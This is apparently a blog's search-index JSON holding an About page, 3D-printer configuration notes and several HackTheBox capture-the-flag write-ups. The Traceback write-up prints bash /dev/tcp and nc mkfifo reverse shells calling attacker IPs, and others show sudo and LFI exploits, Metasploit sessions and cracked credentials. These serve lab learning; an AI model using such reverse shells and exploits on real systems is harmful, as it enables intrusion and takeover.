{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"About I\u2019ve been working in IT for 20 years, started off with desktop support for Windows users for ISPs and local companies. Moved on to Unix Admin and this is where I stayed for a while. Now I\u2019m looking to pivot to Information Security, so I\u2019m studying for the OSCP. I have many hobbies which at times have me multitasking and jumping around with multiple things. 3D Printing (Building, CAD designing and printing random stuff) Anything to do with microcontrollers, hooked on esp8266 and esp32 right now Home Automation, HomeAssistant is a really cool project! Quads (Building and flying, mostly building right now) Learning OffSec :)","title":"About"},{"location":"#about","text":"I\u2019ve been working in IT for 20 years, started off with desktop support for Windows users for ISPs and local companies. Moved on to Unix Admin and this is where I stayed for a while. Now I\u2019m looking to pivot to Information Security, so I\u2019m studying for the OSCP. I have many hobbies which at times have me multitasking and jumping around with multiple things. 3D Printing (Building, CAD designing and printing random stuff) Anything to do with microcontrollers, hooked on esp8266 and esp32 right now Home Automation, HomeAssistant is a really cool project! Quads (Building and flying, mostly building right now) Learning OffSec :)","title":"About"},{"location":"3D/2021-04-06-my-haribo/","text":"A friend of mine got me into 3D priting. I started off with a MonoPrice Select V2 , it was fun learning how printers work and how to generate the gcode, I've also started learning how to do my own drawings. I read about some issues with the Melzi board, so I decided to upgrade the motherboard to a MKS Gen v1.4 , installed TMC2100 silent steppers for XYZ axis and DRV8825 for the extruder. Next I noticed some issues with the monoprice design, it wasn't very rigig. So looked around for ways to fix this and found the Haribo project(https://github.com/PrusaMK2Users/3030_Haribo_Edition). This upgrade was WELL worth it, the printer is now more rigid and with the new motherboard I have more features with the Marlin 2.0 firmware. I have since moved from Marlin to Klipper and not looking back, Klipper is just awesome ! Transformation begins. The Melzi swapped to MKS Gen v1.4 with TMC2100 drivers. Say hello to the volcano block. New printer I've been working on is a HyperCube. This setup is running a SKR V1.4 MCU @ 24V with TMC2209, a BFPTouch (which has been really great, might switch to BLtouch as it has a smaller form factor), Klipper on a Pi3 and a Google Nexus6 as a screen with the newest addtion being the WhamBam bed plate. I'm finding PETG and PLA both stick very well to the PEX coating, just need glue for PETG as it likes to stick too well. There is also a second extruder I have setup for dual filament printing. I had to add an expansion board to my SKR to give me more driver ports as I'm dual a dual Z setup with separate drivers, so the second extruder is on the expansion board. Final step is creating the filament swap macro in Klipper , WIP.","title":"3D printing"},{"location":"3D/TMC5160/","text":"I recently installed a SKR V1.4 with TMC5160 drivers for X/Y/Z/Z1. After performing a Z_Tilt the Z1 motor would error out with Undervoltage! error. After some searching I found the extra parameters to use with klipper and this setup. Before [tmc5160 stepper_z] cs_pin: P1.8 spi_speed: 1000000 spi_software_miso_pin: P0.5 spi_software_mosi_pin: P1.17 spi_software_sclk_pin: P0.4 run_current: 0.800 sense_resistor: 0.075 diag1_pin: ^!P1.27 stealthchop_threshold: 0 interpolate: True Additions driver_TOFF: 4 driver_HEND: 5 driver_HSTRT: 0 driver_IHOLDDELAY: 6 driver_TPOWERDOWN: 10 driver_TBL: 2 driver_tpfd: 0 driver_pwm_autoscale: True driver_pwm_autograd: True driver_pwm_freq: 2 driver_PWM_GRAD: 0 driver_PWM_OFS: 0 driver_PWM_REG: 0 driver_PWM_LIM: 0","title":"TMC5160"},{"location":"3D/mks-genv14/","text":"Arduino Mega 2560 pinouts Pin Number Pin Name Mapped Pin Name 1 PG5 ( OC0B ) Digital pin 4 (PWM) 2 PE0 ( RXD0/PCINT8 ) Digital pin 0 (RX0) 3 PE1 ( TXD0 ) Digital pin 1 (TX0) 4 PE2 ( XCK0/AIN0 ) 5 PE3 ( OC3A/AIN1 ) Digital pin 5 (PWM) 6 PE4 ( OC3B/INT4 ) Digital pin 2 (PWM) 7 PE5 ( OC3C/INT5 ) Digital pin 3 (PWM) 8 PE6 ( T3/INT6 ) 9 PE7 ( CLKO/ICP3/INT7 ) 10 VCC VCC 11 GND GND 12 PH0 ( RXD2 ) Digital pin 17 (RX2) 13 PH1 ( TXD2 ) Digital pin 16 (TX2) 14 PH2 ( XCK2 ) 15 PH3 ( OC4A ) Digital pin 6 (PWM) 16 PH4 ( OC4B ) Digital pin 7 (PWM) 17 PH5 ( OC4C ) Digital pin 8 (PWM) 18 PH6 ( OC2B ) Digital pin 9 (PWM) 19 PB0 ( SS/PCINT0 ) Digital pin 53 (SS) 20 PB1 ( SCK/PCINT1 ) Digital pin 52 (SCK) 21 PB2 ( MOSI/PCINT2 ) Digital pin 51 (MOSI) 22 PB3 ( MISO/PCINT3 ) Digital pin 50 (MISO) 23 PB4 ( OC2A/PCINT4 ) Digital pin 10 (PWM) 24 PB5 ( OC1A/PCINT5 ) Digital pin 11 (PWM) 25 PB6 ( OC1B/PCINT6 ) Digital pin 12 (PWM) 26 PB7 ( OC0A/OC1C/PCINT7 ) Digital pin 13 (PWM) 27 PH7 ( T4 ) 28 PG3 ( TOSC2 ) 29 PG4 ( TOSC1 ) 30 RESET RESET 31 VCC VCC 32 GND GND 33 XTAL2 XTAL2 34 XTAL1 XTAL1 35 PL0 ( ICP4 ) Digital pin 49 36 PL1 ( ICP5 ) Digital pin 48 37 PL2 ( T5 ) Digital pin 47 38 PL3 ( OC5A ) Digital pin 46 (PWM) 39 PL4 ( OC5B ) Digital pin 45 (PWM) 40 PL5 ( OC5C ) Digital pin 44 (PWM) 41 PL6 Digital pin 43 42 PL7 Digital pin 42 43 PD0 ( SCL/INT0 ) Digital pin 21 (SCL) 44 PD1 ( SDA/INT1 ) Digital pin 20 (SDA) 45 PD2 ( RXDI/INT2 ) Digital pin 19 (RX1) 46 PD3 ( TXD1/INT3 ) Digital pin 18 (TX1) 47 PD4 ( ICP1 ) 48 PD5 ( XCK1 ) 49 PD6 ( T1 ) 50 PD7 ( T0 ) Digital pin 38 51 PG0 ( WR ) Digital pin 41 52 PG1 ( RD ) Digital pin 40 53 PC0 ( A8 ) Digital pin 37 54 PC1 ( A9 ) Digital pin 36 55 PC2 ( A10 ) Digital pin 35 56 PC3 ( A11 ) Digital pin 34 57 PC4 ( A12 ) Digital pin 33 58 PC5 ( A13 ) Digital pin 32 59 PC6 ( A14 ) Digital pin 31 60 PC7 ( A15 ) Digital pin 30 61 VCC VCC 62 GND GND 63 PJ0 ( RXD3/PCINT9 ) Digital pin 15 (RX3) 64 PJ1 ( TXD3/PCINT10 ) Digital pin 14 (TX3) 65 PJ2 ( XCK3/PCINT11 ) 66 PJ3 ( PCINT12 ) 67 PJ4 ( PCINT13 ) 68 PJ5 ( PCINT14 ) 69 PJ6 ( PCINT 15 ) 70 PG2 ( ALE ) Digital pin 39 71 PA7 ( AD7 ) Digital pin 29 72 PA6 ( AD6 ) Digital pin 28 73 PA5 ( AD5 ) Digital pin 27 74 PA4 ( AD4 ) Digital pin 26 75 PA3 ( AD3 ) Digital pin 25 76 PA2 ( AD2 ) Digital pin 24 77 PA1 ( AD1 ) Digital pin 23 78 PA0 ( AD0 ) Digital pin 22 79 PJ7 80 VCC VCC 81 GND GND 82 PK7 ( ADC15/PCINT23 ) Analog pin 15 83 PK6 ( ADC14/PCINT22 ) Analog pin 14 84 PK5 ( ADC13/PCINT21 ) Analog pin 13 85 PK4 ( ADC12/PCINT20 ) Analog pin 12 86 PK3 ( ADC11/PCINT19 ) Analog pin 11 87 PK2 ( ADC10/PCINT18 ) Analog pin 10 88 PK1 ( ADC9/PCINT17 ) Analog pin 9 89 PK0 ( ADC8/PCINT16 ) Analog pin 8 90 PF7 ( ADC7/TDI ) Analog pin 7 91 PF6 ( ADC6/TDO ) Analog pin 6 92 PF5 ( ADC5/TMS ) Analog pin 5 93 PF4 ( ADC4/TCK ) Analog pin 4 94 PF3 ( ADC3 ) Analog pin 3 95 PF2 ( ADC2 ) Analog pin 2 96 PF1 ( ADC1 ) Analog pin 1 97 PF0 ( ADC0 ) Analog pin 0 98 AREF Analog Reference 99 GND GND 100 AVCC VCC","title":"MKS Gen v1.4"},{"location":"3D/skrv14/","text":"","title":"SKR v1.4 Turbo"},{"location":"3D/tmc2209/","text":"import requests","title":"TMC2209"},{"location":"HTB/2019-10-20-postman/","text":"Postman was just retired, here is my write-up on how I worked my way through this box. I like to use nmapAutomator for my initial enumeration, and the ports I see open are: PORT STATE SERVICE VERSION 22 /tcp open ssh OpenSSH 7 .6p1 Ubuntu 4ubuntu0.3 ( Ubuntu Linux ; protocol 2 .0 ) | ssh-hostkey: | 2048 46 :83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 ( RSA ) | 256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 ( ECDSA ) | _ 256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 ( ED25519 ) 80 /tcp open http Apache httpd 2 .4.29 (( Ubuntu )) | _http-server-header: Apache/2.4.29 ( Ubuntu ) | _http-title: The Cyber Geek 's Personal Website 10000/tcp open http MiniServ 1.910 (Webmin httpd) |_http-title: Site doesn' t have a title ( text/html ; Charset = iso-8859-1 ) . Service Info: OS: Linux ; CPE: cpe:/o:linux:linux_kernel 6379 /tcp open redis Redis key-value store 4 .0.9 Port 80 is running a personal website Port 10000 I see a webmin login page. I thought about brute forcing, but after seeing this message, \"login lockdown after 5 failed attempts for 2 minutes\", I didn't really want to brute force. Searching for exploits I find this, Webmin 1 .910 - 'Package Updates' Remote Command Execution ( Metasploit ) This requires a username and password, which I do not have :( So I started looked at port 6379, which happens to be redis After some searching, I found this exploit, https://github.com/Avinash-acid/Redis-Server-Exploit/blob/master/redis.py. Reading through it and seeing it's just running some basic commands, I wanted to perform this attack manually. Now I have my public RSA key saved to the user redis \"authorized_keys\", I can SSH into the box. After enumerating the host for a bit I found some interesting stuff in the redis .bash_history Checking to see what is going on in sshd_conf I see the following. OK, we cannot SSH in as the user Matt :( After more enumeration, I found a SSH RSA key backup in /opt/ Inspecting the backup I see it is infact a PRIVATE RSA key -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4 ,ENCRYPTED DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2 7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6 cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9 1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS 5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6 jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X 0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+ Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw == -----END RSA PRIVATE KEY----- Attempting to use the key prompts me for a passphrase :S So, meow, lets bruteforce the key with JohnTheRipper, but first I need to convert it to something john can work with. ssh2john id_rsa > id_john Time for john to bruteforce with the wordlist rockyou.txt, and test it locally. Now that we have a user and password, I check to see if it works on webmin , and YUP, it does. So I went back to the exploit I found earlier for metasploit. done.","title":"2019 10 20 postman"},{"location":"HTB/2019-11-10-traverxec/","text":"Traverxec was just retired, here is my write-up on how I worked my way through this box. Basic enumeration came back with the following ports. PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.9.6 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Visiting the home page I see Scanning the page with nikto I see the following - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.10.165 + Target Hostname: 10.10.10.165 + Target Port: 80 + Start Time: 2019-11-28 02:17:39 (GMT-5) --------------------------------------------------------------------------- + Server: nostromo 1.9.6 + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use '-C all' to force check all possible dirs) Searching google for exploits, I find a msf module https://packetstormsecurity.com/files/155045/Nostromo-1.9.6-Directory-Traversal-Remote-Command-Execution.html msf5 exploit(multi/http/nostromo_code_exec) > show options Module options (exploit/multi/http/nostromo_code_exec): Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.165 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 80 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.44 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic (Unix In-Memory) msf5 exploit(multi/http/nostromo_code_exec) > check [*] 10.10.10.165:80 - The target appears to be vulnerable. msf5 exploit(multi/http/nostromo_code_exec) > run [*] Started reverse TCP handler on 10.10.14.44:4444 [*] Configuring Automatic (Unix In-Memory) target [*] Sending cmd/unix/reverse_perl command payload [*] Command shell session 1 opened (10.10.14.44:4444 -> 10.10.10.165:50386) at 2020-07-13 00:10:03 -0400 id uid=33(www-data) gid=33(www-data) groups=33(www-data) python -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@traverxec:/usr/bin$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@traverxec:/usr/bin$ Running LinEnum finds a .htpasswd Looking at this password hash, it looks like a MD5crypt. I'm going to use hashcat to crack it. So I have a username and password david:Nowonly4me Here is the nostromo web server manual, http://www.nazgul.ch/dev/nostromo_man.html Looking at the nostromo config I see the following. # HOMEDIRS [OPTIONAL] homedirs /home homedirs_public public_www This leads me to believe home directories are available, lets see, looking in /home I see a folder called david lets see if I can reach it via http. Since david has a website, lets see if I can get into public_www in his home folder/ cd /home/david/public_www www-data@traverxec:/home/david/public_www$ ls ls index.html protected-file-area www-data@traverxec:/home/david/public_www$ Yes I can and there is a sub folder called protected-file-area , browsing to this I see: Downloading this file and extracting shows it contains a home folder for david with only a .ssh backup. \u256d\u2500[us-vip-7]-[10.10.14.44]-[triki@parrot]-[/opt/htb/boxes/traverxec/download/home/david/.ssh] \u2570\u2500 $ ls -la rwxr-xr-x 1 triki triki 8 B Wed Dec 11 03:40:41 2019 \uf115 ../ rwxr-xr-x 1 triki triki 84 B Wed Dec 11 03:40:41 2019 \uf115 ./ rw-r--r-- 1 triki triki 397 B Wed Dec 11 03:40:41 2019 \uf15b authorized_keys rw-r--r-- 1 triki triki 1 KiB Wed Dec 11 03:40:41 2019 \uf15b id_rsa rw-r--r-- 1 triki triki 2 KiB Wed Dec 11 03:40:41 2019 \uf15b id_rsa.hash rw-r--r-- 1 triki triki 397 B Wed Dec 11 03:40:41 2019 \uf15b id_rsa.pub Attempting to use the id_rsa key, I'm prompt for a passphrase, time to see if i can brute force it. Now to escalate privileges. Poking around I found I had access to run sudo: david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service Checking out GTFOBins, I found that there is a possibility to trigger the PAGER for journalctl if I make the shell window really small like this. With the PAGE active, I type in !/bin/bash Voila, a shell is popped for ROOT","title":"2019 11 10 traverxec"},{"location":"HTB/2020-03-18-traceback/","text":"Traceback was just retired, here is my write-up on how I worked my way through this box. Starting off with basic enumeration I found these ports open. PORT STATE SERVICE VERSION 22 /tcp open ssh OpenSSH 7 .6p1 Ubuntu 4ubuntu0.3 ( Ubuntu Linux ; protocol 2 .0 ) | ssh-hostkey: | 2048 96 :25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 ( RSA ) | 256 54 :bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d ( ECDSA ) | _ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 ( ED25519 ) 80 /tcp open http Apache httpd 2 .4.29 (( Ubuntu )) | _http-server-header: Apache/2.4.29 ( Ubuntu ) | _http-title: Help us Service Info: OS: Linux ; CPE: cpe:/o:linux:linux_kernel Browsing to the page I see this. In the background I have dirsearch enumerating for subfolder and files on the site. While it does that, I want to check the hackers code on the site. < body > < center > < h1 > This site has been owned </ h1 > < h2 > I have left a backdoor for all the net. FREE INTERNETZZZ </ h2 > < h3 > - Xh4H - </ h3 > <!--Some of the best web shells that you might need ;)--> </ center > </ body > </ html > Hmmm, ok, search for \"best web shells\" comes up with this github page, https://github.com/TheBinitGhimire/Web-Shells, so I try everyone in the list till I hit one. http://trackback.htb/smevk.php poking through the php I found the login/pass to be admin/admin. Logging in I see a really nice interface. Now I can upload my own php, with the following code and save it as triki.php. I do this so I don't confuse other users by using a filename with would be in a dictionary file. When I first did this box someone named their file, index11.php and dirsearch found it. After the box resetting, it took me a bit to realise it wasn't put there by the creator of the box, I digress. <?php exec ( \"/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'\" ); ?> Now I setup a nc listener locally on port 1234 and browse to http://10.10.10.181/triki.php After gettng a shell I checked for the user.txt, but there was not one, all I found was this. no user flag for this user : ( webadmin@traceback:/home/webadmin$ cat note.txt cat note.txt - sysadmin - I have left a tool to practice Lua. I ' m sure you know where to find it. Contact me if you have any question. After running LinEnum, there was something interesting in the webadmin's bash_history. [ - ] Location and contents ( if accessible ) of .bash_history file ( s ) : /home/webadmin/.bash_history ls -la sudo -l nano privesc.lua sudo -u sysadmin /home/sysadmin/luvit privesc.lua rm privesc.lua logout exit id pwd ls -lsah /tmp/s exit Running sudo -l I see this user can run /home/sysadmin/luvit as user sysadmin. Ok, so looking at GTFOBins, I found this code to try. os.execute ( \"/bin/sh\" ) I put that in a file called /dev/shm/privesc.lua then run the command webadmin@traceback:/dev/shm$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua <$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua sh: turning off NDELAY mode whoami sysadmin I have user flag, now I need a proper shell python3 -c \"import pty;pty.spawn('/bin/bash')\" sysadmin@traceback:~$ running pspy64 I see a cronjob running moving some files around 2020 /03/17 20 :21:01 CMD: UID = 0 PID = 4329 | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 2020 /03/17 20 :22:31 CMD: UID = 0 PID = 4340 | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/ I wonder what I have write access to as current user sysasmin. $ find / -path /proc -prune -o -writable /etc/update-motd.d/50-motd-news /etc/update-motd.d/10-help-text /etc/update-motd.d/91-release-upgrade /etc/update-motd.d/00-header /etc/update-motd.d/80-esm I see these files ARE writeable by me, so lets add a rev shell to get root. To get root I did the following: copied my ssh key to the sysadmin's authorized_keys file, on the victim host I added to the 00-header motd \u201crm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 6001 >/tmp/f\u201d sysadmin@traceback:~/.ssh$ cat /etc/update-motd.d/00-header #!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland <kirkland@canonical.com> # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] && . /etc/lsb-release echo \"\\nWelcome to Xh4H land \\n\" rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2 > & 1 | nc 10 .10.14.28 6001 >/tmp/f on my side I setup a nc listener on port 6001 then I ssh'd in to call the 00-header motd, which called nc to call my PC on port 6001","title":"2020 03 18 traceback"},{"location":"HTB/2020-06-16-htb-oh-my-zsh-theme/","text":"HTB recently release it's web VM PwnBox which is running ParrotOS. The shell of choice is bash with a slick PS1 layout. I like to use ZSH combined with oh-my-zsh for extra juice, and decided to take a stab at writing a theme for oh-my-zsh. Knowing nothing about how to do this, I grabbed an existing one for an example and started tearing it apart and adding what I needed. I've added a bit more to my shell with cowsay , lolcat and I use Guake Terminal for it's top-down feature(quake, old habbits die hard :) ) My code can be found here, http://github.com/ikirt/htb-ohmyzsh-theme Here is what HTB PwnBox BASH shell looks like My screenshot as normal user, who you gonna call ? I AM Root","title":"2020 06 16 htb oh my zsh theme"},{"location":"HTB/2020-07-12-blunder/","text":"Blunder was just retired, here is my write-up on how I worked my way through this box. Basic enumeration came back with the following ports. tcp/80/nmap-http - Identified HTTP Server: Apache/2.4.41 (Ubuntu) Looks like the attack surface is going to be web based for this one. So I decide to kickoff a web scanning to see what's on the site. Visiting the site I see a CMS. Poking around, there isn't much here but random information. Time to see what's hidden on the site, dirsearch came back with the following. 403 277B http://10.10.10.191:80/.php 403 277B http://10.10.10.191:80/.html 403 277B http://10.10.10.191:80/icons/ 200 2KB http://10.10.10.191:80/admin/ 200 30B http://10.10.10.191:80/install.php 200 22B http://10.10.10.191:80/robots.txt 200 118B http://10.10.10.191:80/todo.txt Checking out the todo.txt first I see: -Update the CMS -Turn off FTP - DONE -Remove old users - DONE -Inform fergus that the new blog needs images - PENDING Got my first username fergus (save that for later). Next I checked the /admin/ page on the site. Attempting normal word lists produced zero results. Googling for bludit exploits, I came across this, https://rastating.github.io/bludit-brute-force-mitigation-bypass/. This page explains that Bludit uses a method to only allow 10 login attempts based on tracking the users IP address from the headers. This exploit passes random information into the X-Forwarded-For http header to trick the site into allowing MANY password attempts. Now I need a password list, a shot in the dark was to run cewl against the site to see if the password was used somewhere there. cewl -w blunder-wordlist.txt -d 10 -m 1 http://10.10.10.191 Running the exploit script with the cewl password list finds a password !! \u256d\u2500[us-vip-7]-[10.10.14.44]-[triki@parrot]-[/opt/htb/boxes/blunder/exploits] \u2570\u2500[\u2622] $ python3 ./brute.py [*] Trying: to [*] Trying: the [*] Trying: of [*] Trying: Load ... [*] Trying: fictional [*] Trying: character [*] Trying: ********* SUCCESS: Password found! Use fergus:********** to login. Testing the login shows to be successful :) Search Google for Bludit exploits, I found this msf module, https://www.exploit-db.com/exploits/47699 Running the exploit. I learned something very important here as I spent a couple days using automated scripts to enumerate for me and not really finding what I needed. After manually enumerating the webroot I found a newer version(bludit-3.10.0a) of bludit, so I decided to poke through it. After further enumerating, I found a file called users.php in the databases folder, inside I found this. www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php cat users.php <?php defined('BLUDIT') or die('Bludit CMS.'); ?> { \"admin\": { \"nickname\": \"Hugo\", \"firstName\": \"Hugo\", \"lastName\": \"\", \"role\": \"User\", \"password\": \"faca404fd5c0a31cf1897b823c695c85cffeb98d\", \"email\": \"\", \"registered\": \"2019-11-27 07:40:55\", \"tokenRemember\": \"\", \"tokenAuth\": \"b380cb62057e9da47afce66b4615107d\", \"tokenAuthTTL\": \"2009-03-15 14:00\", \"twitter\": \"\", \"facebook\": \"\", \"instagram\": \"\", \"codepen\": \"\", \"linkedin\": \"\", \"github\": \"\", \"gitlab\": \"\"} } Taking that password to google I see it's a SHA-1 hash, going to this site I can reverse it, https://sha1.gromweb.com/?hash=faca404fd5c0a31cf1897b823c695c85cffeb98d to see the password is Password120 Momemt of truth, can I su to the hugo user with this password. www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su - hugo su - hugo Password: Password120 hugo@blunder:~$ id id uid=1001(hugo) gid=1001(hugo) groups=1001(hugo) sweet, got the user flag Now, onto ROOT, ok, so after some manual enumeration, I found some pictures on the user shuan 's Pictures folder. The first screenshot looks like some buffer overflow, so I do a google search for sudo 1.8.27 exploit and the first hit is exploitdb https://www.exploit-db.com/exploits/47502 EXPLOIT: sudo -u#-1 /bin/bash hugo@blunder:~$ sudo -u#-1 /bin/bash sudo -u#-1 /bin/bash Password: Password120 root@blunder:/home/hugo# id id uid=0(root) gid=1001(hugo) groups=1001(hugo) AND, I got ROOT","title":"2020 07 12 blunder"},{"location":"HTB/2020-07-16-tabby/","text":"Tabby was just retired, here is my write-up on how I worked my way through this box. Enumerating the ports on the host, I see the following: PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http syn-ack ttl 63 Apache Tomcat | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Browing to the host on port 80 I see: Looks like this site was already hacked and something was patched. Checking port 8080 I am presented with this: Browsing to http://10.10.10.194:8080/manager/html and http://10.10.10.194:8080/host-manager/html, I am prompt for a password Not knowing what these are for I read the documentation on Tomcat's site to find out these are management GUIs to allow developers to create mutliple web projects and manage them individually. Ok, this attack vector is going to be web based. Testing default tomcat accounts failed, so I went to google to see if there are any recent vulnerabilities. After a couple minutes I came across ghostcat , which leverages LFI. Testing some paths to see if I can read the /etc/passwd , I am successfull with the following: http://megahosting.htb/news.php?file=../../../../etc/passwd Well, well, now I have a user to hunt for ash for password. If anyone is interested there is a tool to help test for LFI, https://github.com/chrispetrou/FDsploit Now, I need to find a file on the tomcat server to hold some credentials. Not knowing what I need, I decided to install tomcat locally on my box to see what the config files called and located. After installing I see tomcat is called /usr/local/tomcat9/ and there is a config file here /usr/local/tomcat9/etc/tomcat-users/xml that hosts the username and password for the host-manager * page. So, seeing how many subfolders I had to traverse to get to /etc/passwd , I decided to try this URL out. http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml Pages loads, but I get a blank page, but if I check source code(CTRL-U) I see this: Testing the username and password found, lets me into the tomcat host-manager Searching google for waying to exploit tomcat host-manager , I came across this article, https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/. This page explains how to use impacket smbserver to host files on attacking smb server and tomcat would load the file remotely. I could not get this to load on this instance. So building on that, I found out that tomcat user role manager-script grants access to an API for scripting. Further digging I found I can you a curl command to upload a file to tomcat host-manager, list the instances host on tomcat. tomcat documentation, 